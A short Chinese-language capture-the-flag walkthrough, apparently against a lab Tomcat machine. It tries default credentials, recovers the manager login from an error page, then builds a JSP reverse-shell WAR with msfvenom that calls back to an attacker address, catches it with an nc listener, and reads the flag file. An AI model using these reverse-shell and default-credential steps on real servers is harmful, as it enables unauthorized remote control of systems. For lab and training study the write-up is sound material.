# 漏洞利用

![](../Images/df6cd602bc596a61d58c50356af55e89.png)

使用弱口令 admin/admin 成功登录，但是这里却没有看到上传点，我怀疑不太对，因为tomcat 的 登录密码一般是 tomcat

![](../Images/e6477bf55c30a2fbb7364e803abc37bb.png)

在输入密码的时候选择取消，然后在错误页面中得到了一个账号密码

```


username = tomcat
```

![](../Images/e362d6498d43c599167e647f2356f85e.png)

这次权限就对了，然后使用 msfvenom 去生成一个 war 马

```

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > shell.war
```

然后使用 nc 监听一个端口

```

nc -nvlp 4444
```

![](../Images/a0e923e12bb6eddc7e8e902bc746ece0.png)

上传后去访问一下

```

┌──(root💀kali)-[~/Desktop]# nc -nvlp 4444


```

成功拿到一个 shell

```
c:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"


```

拿到 user 和 root 权限的 flag 文件，倒是不用提权了
